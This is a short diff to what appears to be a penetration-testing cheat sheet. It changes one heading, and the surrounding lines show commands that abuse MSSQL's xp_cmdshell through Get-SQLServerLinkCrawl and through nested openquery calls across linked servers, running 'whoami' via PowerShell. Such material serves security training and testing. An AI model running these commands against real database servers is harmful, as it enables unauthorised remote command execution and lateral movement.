@@ -922,7 +922,7 @@ Turn xp_cmdshell on:
 
 ```Get-SQLServerLinkCrawl -Instance ecorp-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
 
-OR From within SQL:
+OR via SQL:
 
 ```
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp- mgmt",''select * from openquery("eu-sql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
